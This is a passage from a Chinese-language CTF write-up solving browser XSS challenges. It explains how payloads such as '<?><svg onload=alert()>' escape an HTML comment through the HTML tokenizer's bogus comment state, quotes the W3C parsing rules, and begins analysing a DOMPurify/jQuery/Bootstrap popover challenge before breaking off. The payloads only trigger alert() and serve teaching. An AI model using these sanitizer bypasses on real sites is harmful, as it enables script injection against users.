class="hljs-symbol">&amp;gt;</span><span class="hljs-symbol">&amp;lt;</span>svg/onload=alert()<span class="hljs-symbol">&amp;gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>在第二步渲染的时候就自然不可能闭合注释了，只能得到如下代码：</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">&lt;!-- &lt;p&gt; DE<span class="hljs-doctag">BUG:</span> &lt;template&gt;--&amp;gt;&amp;lt;svg/onload=alert()&amp;gt;&lt;/template&gt; &lt;/p&gt; --&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>所以当我们借助 img 属性进行绕过的时候，第一步得到的实际上是：</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">title</span>=<span class="hljs-string">"--&gt;&lt;svg/onload=alert()&gt;"</span>&gt;</span>1</span><br></pre></td></tr></tbody></table></figure><p></p><p>HTML parser不会将 title 属性内的字符串进行转义，所以第二步当直接输出到页面的时候</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">&lt;!-- &lt;p&gt; DE<span class="hljs-doctag">BUG:</span> &lt;template&gt;&lt;img title="--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">"alert()"</span>&gt;</span>"<span class="hljs-symbol">&amp;gt;</span>1 <span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span> --<span class="hljs-symbol">&amp;gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>然后当 HTML parser 解析这段代码时，首先由<code>&lt;!</code>的存在，会进入<a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-markup-declaration-open-state" target="_blank" rel="noopener">Markup declaration open state</a>，中间的代码<code>&lt;p&gt; DEBUG: &lt;template&gt;&lt;img title="</code>会让 HTML parser 进入一些其他关于 comment 的状态，这些都无关紧要，最后的<code>--&gt;</code>让 HTML parser 进入到了<a href="https://www.w3.org/TR/html52/syntax.html#comment-end-state" target="_blank" rel="noopener">Comment End State</a>，根据 W3 文档：</p><blockquote><p>Comment end state</p><p>Consume the <a href="https://www.w3.org/TR/html52/syntax.html#next-input-character" target="_blank" rel="noopener">next input character</a>:</p><ul><li><p>U+003E GREATER-THAN SIGN (&gt;)</p><p>Switch to the <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-data-state" target="_blank" rel="noopener">data state</a>. Emit the comment token.</p></li></ul></blockquote><p>接着我们就进入到了 <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-data-state" target="_blank" rel="noopener">data state</a>，也就是结束了注释解析状态回到了最开始的 HTML 解析状态，这样就导致我们就成功逃逸了注释符。</p><h3 id="Difficult-Version"><a href="#Difficult-Version" class="headerlink" title="Difficult Version"></a>Difficult Version</h3><p>再过滤了实体编码<code>&amp;#;</code>之后我们要怎么绕过呢？我们先给出一个 Trick ，在这里我们可以使用<code>&lt;?</code>进行绕过。</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200131165157.png" alt=""></p><p>可以看到我们在使用了<code>&lt;?</code>之后成功把 p 标签逃逸了出来，可是为什么呢？我们可以输出第一步的<code>template.innerHTML</code>看看</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200131165902.png" alt=""></p><p>我们可以发现在第一步渲染的时候，传入的<code>&lt;?</code>已经变成了<code>&lt;!--?--&gt;</code>，存在<code>--&gt;</code>可以将注释闭合。可是这是为什么呢？</p><p>在<code>template.innerHTML = input</code>的时候，会解析<code>input</code>，然后使用 HTML parser 解析，根据 W3 文档</p><blockquote><p>​    Implementations must act as if they used the following state machine to tokenize HTML. The state machine must start in the <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-data-state" target="_blank" rel="noopener">data state</a>.</p></blockquote><p>解析到<code>&lt;</code>的时候，HTML parser 正处于 <a href="https://www.w3.org/TR/html52/syntax.html#data-state" target="_blank" rel="noopener">data state</a></p><blockquote><p>Data state</p><p>Consume the <a href="https://www.w3.org/TR/html52/syntax.html#next-input-character" target="_blank" rel="noopener">next input character</a>:</p><ul><li><p>U+0026 AMPERSAND (&amp;)</p><p>Set the <a href="https://www.w3.org/TR/html52/syntax.html#return-state" target="_blank" rel="noopener">return state</a> to the <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-data-state" target="_blank" rel="noopener">data state</a>. Switch to the <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-character-reference-state" target="_blank" rel="noopener">character reference state</a>.</p></li><li><p>U+003C LESS-THAN SIGN (&lt;)</p><p>Switch to the <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-tag-open-state" target="_blank" rel="noopener">tag open state</a>.</p></li><li><p>U+0000 NULL</p><p><a href="https://www.w3.org/TR/html52/syntax.html#parse-errors" target="_blank" rel="noopener">Parse error</a>. Emit the <a href="https://www.w3.org/TR/html52/syntax.html#current-input-character" target="_blank" rel="noopener">current input character</a> as a character token.</p></li><li><p>EOF</p><p>Emit an end-of-file token.</p></li><li><p>Anything else</p><p>Emit the <a href="https://www.w3.org/TR/html52/syntax.html#current-input-character" target="_blank" rel="noopener">current input character</a> as a character token.</p></li></ul></blockquote><p>于是进入 <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-tag-open-state" target="_blank" rel="noopener">tag open state</a></p><blockquote><p>Tag open state</p><p>Consume the <a href="https://www.w3.org/TR/html52/syntax.html#next-input-character" target="_blank" rel="noopener">next input character</a>:</p><ul><li><p>U+0021 EXCLAMATION MARK (!)</p><p>Switch to the <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-markup-declaration-open-state" target="_blank" rel="noopener">markup declaration open state</a>.</p></li><li><p>U+002F SOLIDUS (/)</p><p>Switch to the <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-end-tag-open-state" target="_blank" rel="noopener">end tag open state</a>.</p></li><li><p><a href="https://www.w3.org/TR/html52/infrastructure.html#ascii-letters" target="_blank" rel="noopener">ASCII letter</a></p><p>Create a new start tag token, set its tag name to the empty string. <a href="https://www.w3.org/TR/html52/syntax.html#reconsume" target="_blank" rel="noopener">Reconsume</a> in the <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-tag-name-state" target="_blank" rel="noopener">tag name state</a>.</p></li><li><p>U+003F QUESTION MARK (?)</p><p><a href="https://www.w3.org/TR/html52/syntax.html#parse-errors" target="_blank" rel="noopener">Parse error</a>. Create a comment token whose data is the empty string. <a href="https://www.w3.org/TR/html52/syntax.html#reconsume" target="_blank" rel="noopener">Reconsume</a> in the <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-bogus-comment-state" target="_blank" rel="noopener">bogus comment state</a>.</p></li><li><p>Anything else</p><p><a href="https://www.w3.org/TR/html52/syntax.html#parse-errors" target="_blank" rel="noopener">Parse error</a>. Emit a U+003C LESS-THAN SIGN character token. <a href="https://www.w3.org/TR/html52/syntax.html#reconsume" target="_blank" rel="noopener">Reconsume</a> in the <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-data-state" target="_blank" rel="noopener">data state</a>.</p></li></ul></blockquote><p>下一个字符是<code>?</code>，根据文档，HTML parser 会创建一个空的 comment token，进入 <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-bogus-comment-state" target="_blank" rel="noopener">bogus comment state</a>，</p><blockquote><p>Bogus comment state</p><p>Consume the <a href="https://www.w3.org/TR/html52/syntax.html#next-input-character" target="_blank" rel="noopener">next input character</a>:</p><ul><li><p>U+003E GREATER-THAN SIGN (&gt;)</p><p>Switch to the <a href="https://www.w3.org/TR/html52/syntax.html#tokenizer-data-state" target="_blank" rel="noopener">data state</a>. Emit the comment token.</p></li><li><p>EOF</p><p>Emit the comment. Emit an end-of-file token.</p></li><li><p>U+0000 NULL</p><p>Append a U+FFFD REPLACEMENT CHARACTER character to the comment token’s data.</p></li><li><p>Anything else</p><p>Append the <a href="https://www.w3.org/TR/html52/syntax.html#current-input-character" target="_blank" rel="noopener">current input character</a> to the comment token’s data.</p></li></ul></blockquote><p>下一个字符是 anything else，会将这个字符插入到刚刚的 comment 中，也就是我们上图看到的<code>&lt;!--?--&gt;</code>，例如输入是<code>aaa&lt;?bbb&gt;ccc</code>的时候，解析到第 i 个字符时，innerHTML 的结果是这样的：</p><p></p><figure class="highlight django hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-xml">a</span></span><br><span class="line"><span class="hljs-xml">aa</span></span><br><span class="line"><span class="hljs-xml">aaa</span></span><br><span class="line"><span class="hljs-xml">aaa<span class="hljs-tag">&lt;</span></span></span><br><span class="line"><span class="hljs-xml">aaa<span class="hljs-comment">&lt;!--?--&gt;</span></span></span><br><span class="line"><span class="hljs-xml">aaa<span class="hljs-comment">&lt;!--?b--&gt;</span></span></span><br><span class="line"><span class="hljs-xml">aaa<span class="hljs-comment">&lt;!--?bb--&gt;</span></span></span><br><span class="line"><span class="hljs-xml">aaa<span class="hljs-comment">&lt;!--?bbb--&gt;</span></span></span><br><span class="line"><span class="hljs-xml">aaa<span class="hljs-comment">&lt;!--?bbb--&gt;</span></span></span><br><span class="line"><span class="hljs-xml">aaa<span class="hljs-comment">&lt;!--?bbb--&gt;</span>c</span></span><br><span class="line"><span class="hljs-xml">aaa<span class="hljs-comment">&lt;!--?bbb--&gt;</span>cc</span></span><br><span class="line"><span class="hljs-xml">aaa<span class="hljs-comment">&lt;!--?bbb--&gt;</span>ccc</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>直到该状态遇到了<code>&gt;</code>为止，回到 data state。注意这个 Bogus comment state 解析到<code>&gt;</code>的时候会直接回到 data state，也就是 HTML parser 最开始解析的状态，这个时候我们就可以插入 HTML 代码了。</p><p>当我们传入<code>&lt;?&gt;&lt;svg onload=alert()&gt;</code>时，第一步<code>template.innerHTML</code>我们得到的是</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">&lt;!--?--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">"alert()"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>第二步<code>pwnme.innerHTML</code>我们得到的是</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">&lt;!-- &lt;p&gt; DE<span class="hljs-doctag">BUG:</span> &lt;template&gt;&lt;!--?--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">"alert()"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span> --<span class="hljs-symbol">&amp;gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>这时候 HTML parser 解析与我们在 Easy Version 分析差不多，只有遇到<code>--&gt;</code>的时候结束 Comment State 相关状态回到 data state，所以我们就成功执行了 XSS。</p><h2 id="Keanu"><a href="#Keanu" class="headerlink" title="Keanu"></a>Keanu</h2><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">&lt;!-- Challenge --&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">number</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"number"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"display:none"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">number</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"alert alert-primary"</span> <span class="hljs-attr">role</span>=<span class="hljs-string">"alert"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"welcome"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"keanu"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn btn-primary btn-sm"</span> <span class="hljs-attr">data-toggle</span>=<span class="hljs-string">"popover"</span> <span class="hljs-attr">data-content</span>=<span class="hljs-string">"DM @PwnFunction"</span></span></span><br><span class="line"><span class="hljs-tag">    <span class="hljs-attr">data-trigger</span>=<span class="hljs-string">"hover"</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">"alert(`If you solved it, DM me @PwnFunction :)`)"</span>&gt;</span>Solved it?<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-actionscript">    <span class="hljs-comment">/* Input */</span></span></span><br><span class="line"><span class="hljs-actionscript">    <span class="hljs-keyword">var</span> number = (<span class="hljs-keyword">new</span> URL(location).searchParams.get(<span class="hljs-string">'number'</span>) || <span class="hljs-string">"7"</span>)[<span class="hljs-number">0</span>],</span></span><br><span class="line"><span class="hljs-actionscript">        name = DOMPurify.sanitize(<span class="hljs-keyword">new</span> URL(location).searchParams.get(<span class="hljs-string">'name'</span>), { SAFE_FOR_JQUERY: <span class="hljs-literal">true</span> });</span></span><br><span class="line"><span class="hljs-javascript">    $(<span class="hljs-string">'number#number'</span>).html(number);</span></span><br><span class="line"><span class="hljs-javascript">    $(<span class="hljs-string">'#welcome'</span>).html(<span class="hljs-string">`Welcome &lt;b&gt;<span class="hljs-subst">${name || <span class="hljs-string">"Mr. Wick"</span>}</span>!&lt;/b&gt;`</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-actionscript">    <span class="hljs-comment">/* Greet */</span></span></span><br><span class="line"><span class="hljs-javascript">    $(<span class="hljs-string">'#keanu'</span>).popover(<span class="hljs-string">'show'</span>)</span></span><br><span class="line"><span class="hljs-javascript">    setTimeout(<span class="hljs-function"><span class="hljs-params">_</span> =&gt;</span> {</span></span><br><span class="line"><span class="hljs-javascript">        $(<span class="hljs-string">'#keanu'</span>).popover(<span class="hljs-string">'hide'</span>)</span></span><br><span class="line">    }, 2000)</span><br><span class="line"></span><br><span class="line"><span class="hljs-actionscript">    <span class="hljs-comment">/* Check Magic Number */</span></span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">var</span> magicNumber = <span class="hljs-built_in">Math</span>.floor(<span class="hljs-built_in">Math</span>.random() * <span class="hljs-number">10</span>);</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">var</span> number = <span class="hljs-built_in">eval</span>($(<span class="hljs-string">'number#number'</span>).html());</span></span><br><span class="line">    if (magicNumber === number) {</span><br><span class="line"><span class="hljs-actionscript">        alert(<span class="hljs-string">"You're Breathtaking!"</span>)</span></span><br><span class="line">    }</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>本题题目引入了四个 js 文件：</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">&lt;!-- DOMPurify(2.0.7) --&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://cdnjs.cloudflare.com/ajax/libs/dompurify/2.0.7/purify.min.js"</span></span></span><br><span class="line"><span class="hljs-tag">    <span class="hljs-attr">integrity</span>=<span class="hljs-string">"sha256-iO9yO1Iy0P2hJNUeAvUQR2ielSsGJ4rOvK+EQUXxb6E="</span> <span class="hljs-attr">crossorigin</span>=<span class="hljs-string">"anonymous"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-comment">&lt;!-- Jquery(3.4.1), Popper(1.16.0), Bootstrap(4.4.1) --&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://code.jquery.com/jquery-3.4.1.slim.min.js"</span></span></span><br><span class="line"><span class="hljs-tag">    <span class="hljs-attr">integrity</span>=<span class="hljs-string">"sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n"</span></span></span><br><span class="line"><span class="hljs-tag">    <span class="hljs-attr">crossorigin</span>=<span class="hljs-string">"anonymous"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"</span></span></span><br><span class="line"><span class="hljs-tag">    <span class="hljs-attr">integrity</span>=<span class="hljs-string">"sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo"</span></span></span><br><span class="line"><span class="hljs-tag">    <span class="hljs-attr">crossorigin</span>=<span class="hljs-string">"anonymous"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js"</span></span></span><br><span class="line"><span class="hljs-tag">    <span class="hljs-attr">integrity</span>=<span class="hljs-string">"sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6"</span></span></span><br><span class="line"><span class="hljs-tag">    <span class="hljs-attr">crossorigin</span>=<span class="hljs-string">"anonymous"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>这个题目也比较有意思，额外给我们增加的这几个 js 文件，也就是说这几个文件就是这道题我们可能需要用的工具了。</p><p>Purify.js 是一个 XSS WAF，Popper.js是一个用于构造提示的组件，题目中也给了一个简单的使用 popper 的例子，Jqeury.js 与 Bootstrap 就不多说了。</p><p>首先我们来看我们的可控点，一个是 name 参数，另一个是 number 参数。然而 number 参数我们却只能使用一位，而 name 参数虽然任意长度可控，但是要经过 XSS WAF 过滤。虽然之前有一些利用 mxss bypass Domprify 的事例，但是都是在 2.0 左右的版本，这里的 2.0.7 又是最新的版本，应该不会是什么新的绕过，否则 number 参数与最后的 <code>eval($("number#number").html());</code> 就没用了，并且还有一些其他工具我们没有用上。</p><p>所以我们应该能用到的就是通过最后一个<code>eval($("number#number").html())</code>进行 XSS ，而 number 我们可控的只有一位，我们可能得想一些其他办法添加 number 标签当中的内容。</p><p>我们可以看到 <a href="https://getbootstrap.com/docs/4.0/components/popovers" target="_blank" rel="noopener">popper document</a> 结合题目给出的那个例子，我们可以发现貌似这个 popper.js 可以满足我们添加新内容条件，而在文档 <a href="https://getbootstrap.com/docs/4.0/components/popovers/#options" target="_blank" rel="noopener">options</a> 部分，我们可以到有一些我们值得关注的参数：</p><table><thead><tr><th>Name</th><th>Type</th><th>Default</th><th>Description</th></tr></thead><tbody><tr><td>container</td><td>string | element | false</td><td>false</td><td>Appends the popover to a specific element. Example: <code>container: 'body'</code>. This option is particularly useful in that it allows you to position the popover in the flow of the document near the triggering element - which will prevent the popover from floating away from the triggering element during a window resize.</td></tr><tr><td>content</td><td>string | element | function</td><td>‘’</td><td>Default content value if <code>data-content</code> attribute isn’t present.If a function is given, it will be called with its <code>this</code> reference set to the element that the popover is attached to.</td></tr></tbody></table><p>我们可以从文档知道，我们可以通过<code>data-container</code>来控制 popover 的位置，<code>data-content</code>来控制内容，于是我们是不是可以有一个想法把这个 